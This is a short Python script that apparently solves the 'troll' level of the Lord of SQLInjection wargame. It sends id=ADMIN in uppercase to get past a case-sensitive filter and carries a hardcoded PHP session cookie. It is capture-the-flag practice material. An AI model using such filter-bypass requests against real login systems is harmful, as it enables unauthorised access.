import requests

url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?"
cookie = {'PHPSESSID':'h6l3pi7c0om563rq0eik9vrnf9'}

def solve():
    query = "id=ADMIN"
    res = requests.get(url=url+query,cookies=cookie)
    if "TROLL Clear!" in res.text:
        print("TROLL Clear!")

if __name__ == "__main__":
    solve()

